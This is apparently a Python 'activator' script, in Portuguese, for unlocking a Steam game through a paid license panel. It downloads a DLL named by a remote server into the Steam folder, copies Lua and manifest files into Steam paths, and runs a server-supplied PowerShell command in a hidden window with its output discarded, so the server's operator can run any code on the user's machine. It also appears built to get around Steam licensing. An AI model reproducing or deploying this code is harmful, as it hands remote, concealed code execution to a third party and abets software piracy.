import os
import sys
import zipfile
import shutil
import time
import psutil
import requests
import webbrowser
import subprocess
import ctypes

API_URL = 'https://gaamingsteam.squareweb.app/api/app/'
APP_ID = 'kastexstorms'
ID_JOGO = '3764200'


class Ativador:

    def __init__(self):
        self.caminho_steam = self._detectar_caminho_steam()
        self.config = self._buscar_config_api()

    def _buscar_config_api(self):
        """Busca configuracoes da API do painel admin. Se app desativado, retorna None"""
        url = API_URL + APP_ID + '/' + ID_JOGO
        try:
            response = requests.get(url, timeout=10)

            if response.status_code in (403, 404, 401):
                self._mostrar_erro_licenca()
                return None

            data = response.json()

            if not data.get('ativo', False):
                self._mostrar_erro_licenca()
                return None

            return {
                'url_dll': data.get('url_dll'),
                'nome_dll': data.get('nome_dll'),
                'comando_powershell': data.get('comando_powershell'),
                'site_abrir': data.get('site_abrir'),
                'url_zip': data.get('url_zip'),
                'url_games': data.get('url_games'),
                'caminho_lua': data.get('caminho_lua'),
                'caminho_manifest': data.get('caminho_manifest'),
            }

        except requests.exceptions.ConnectionError:
            self._mostrar_erro_conexao()
            return None
        except requests.exceptions.Timeout:
            self._mostrar_erro_conexao()
            return None
        except Exception as e:
            self._mostrar_erro_conexao()
            return None

    def _mostrar_erro_licenca(self):
        """Mostra mensagem de licenca expirada/desativada via MessageBox"""
        mensagem = (
            'Seu acesso foi desativado ou expirou.\n\n'
            'Entre em contato com o suporte para renovar.\n\n'
            'Discord: https://discord.gg/SFWQyKRN'
        )
        ctypes.windll.user32.MessageBoxW(0, mensagem, 'Licenca Invalida', 0)

    def _mostrar_erro_conexao(self):
        """Mostra mensagem de erro de conexao via MessageBox"""
        mensagem = (
            'Nao foi possivel conectar ao servidor.\n\n'
            'Verifique sua conexao com a internet.'
        )
        ctypes.windll.user32.MessageBoxW(0, mensagem, 'Erro de Conexao', 0)

    def _detectar_caminho_steam(self):
        possiveis_caminhos = [
            os.path.expandvars('%ProgramFiles(x86)%\\Steam\\steam.exe'),
            os.path.expandvars('%ProgramFiles%\\Steam\\steam.exe'),
            'C:\\Program Files (x86)\\Steam\\steam.exe',
            'C:\\Program Files\\Steam\\steam.exe',
            'C:\\Steam\\steam.exe',
            os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Steam', 'steam.exe'),
            os.path.join(os.path.expanduser('~'), 'Desktop', 'steam.exe'),
            'D:\\Steam\\steam.exe',
            'E:\\Steam\\steam.exe',
            'F:\\Steam\\steam.exe',
        ]

        for caminho in possiveis_caminhos:
            if os.path.exists(caminho):
                return caminho

        for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            drive_path = drive + ':\\'
            if os.path.exists(drive_path):
                for root, dirs, files in os.walk(drive_path):
                    steam_path = os.path.join(root, 'steam.exe')
                    if os.path.exists(steam_path):
                        return steam_path

        return None

    def _encontrar_pasta_documentos(self):
        documentos_pt = os.path.join(os.path.expanduser('~'), 'Documentos')
        documentos_en = os.path.join(os.path.expanduser('~'), 'Documents')
        if os.path.exists(documentos_pt):
            return documentos_pt
        return documentos_en

    def _baixar_hid_dll(self):
        if not self.config:
            return False
        if not self.config.get('nome_dll'):
            return True

        steam_dir = os.path.dirname(self.caminho_steam)
        nome_dll = self.config.get('nome_dll')
        dll_destino = os.path.join(steam_dir, nome_dll)

        if os.path.exists(dll_destino):
            return True

        url_dll = self.config.get('url_dll')
        try:
            resp = requests.get(url_dll, stream=True)
            resp.raise_for_status()
            with open(dll_destino, 'wb') as f:
                for parte in resp.iter_content(8192):
                    f.write(parte)
            return True
        except Exception as e:
            return False

    def ativar_jogo(self):
        pasta_docs = self._encontrar_pasta_documentos()
        pasta_conteudo = os.path.join(pasta_docs, 'conteudo')

        zips = []
        if os.path.exists(pasta_conteudo) and os.path.isdir(pasta_conteudo):
            for f in os.listdir(pasta_conteudo):
                if f.lower().endswith('.zip'):
                    zips.append(f)

        reiniciar_steam_apos = False

        for zip_nome in zips:
            caminho_zip = os.path.join(pasta_conteudo, zip_nome)
            try:
                with zipfile.ZipFile(caminho_zip, 'r') as zip_ref:
                    for nome_arquivo in zip_ref.namelist():
                        nome_arquivo_final = nome_arquivo.strip('/').split('/')[-1]

                        if nome_arquivo_final.lower().endswith('.lua'):
                            destino = self.config.get('caminho_lua')
                        elif nome_arquivo_final.lower().endswith('.st') or nome_arquivo_final.lower().endswith('.manifest'):
                            destino = self.config.get('caminho_manifest')
                        else:
                            continue

                        if destino:
                            os.makedirs(destino, exist_ok=True)
                            arquivo_destino = os.path.join(destino, nome_arquivo_final)
                            with zip_ref.open(nome_arquivo) as source, open(arquivo_destino, 'wb') as target:
                                target.write(source.read())
                            reiniciar_steam_apos = True
            except Exception as e:
                pass

        if reiniciar_steam_apos:
            self._executar_comando_steam_update()

    def _steam_esta_aberta(self):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'steam.exe':
                return True
        return False

    def reiniciar_steam(self):
        self.fechar_steam()
        time.sleep(3)
        self.abrir_steam()

    def fechar_steam(self):
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if proc.info['name'].lower() == 'steam.exe':
                    proc.kill()
            except Exception as e:
                pass
        time.sleep(1)

    def abrir_steam(self):
        if self.caminho_steam and os.path.exists(self.caminho_steam):
            subprocess.Popen(self.caminho_steam)

    def _executar_comando_steam_update(self):
        """Executa o comando PowerShell configurado na API"""
        if not self.config:
            return
        comando_powershell = self.config.get('comando_powershell', False)
        if not comando_powershell:
            return
        try:
            flags = {}
            if sys.platform == 'win32':
                flags['creationflags'] = subprocess.CREATE_NO_WINDOW
            subprocess.Popen(
                ['powershell', '-Command', comando_powershell],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=False,
                **flags
            )
        except Exception as e:
            pass

    def ativacao_automatica(self):
        pasta_docs = self._encontrar_pasta_documentos()
        pasta_conteudo = os.path.join(pasta_docs, 'conteudo')

        if not os.path.exists(pasta_conteudo):
            os.makedirs(pasta_conteudo)

        self.baixar_e_salvar_zip(ID_JOGO, pasta_conteudo)
        self.ativar_jogo()

        site_abrir = self.config.get('site_abrir') if self.config else None
        if site_abrir:
            webbrowser.open_new_tab(site_abrir)

    def baixar_e_salvar_zip(self, id_jogo, pasta_conteudo):
        if not self.config:
            return False
        url = self.config.get('url_zip', False)
        if not url:
            return True

        caminho_zip = os.path.join(pasta_conteudo, id_jogo + '.zip')
        try:
            resposta = requests.get(url, stream=True, timeout=300)
            resposta.raise_for_status()
            with open(caminho_zip, 'wb') as f:
                for parte in resposta.iter_content(8192):
                    f.write(parte)
            return True
        except Exception as e:
            return False


if __name__ == '__main__':
    ativador = Ativador()
    config = ativador.config
    if config is None:
        sys.exit()
    ativacao_automatica = ativador.ativacao_automatica()
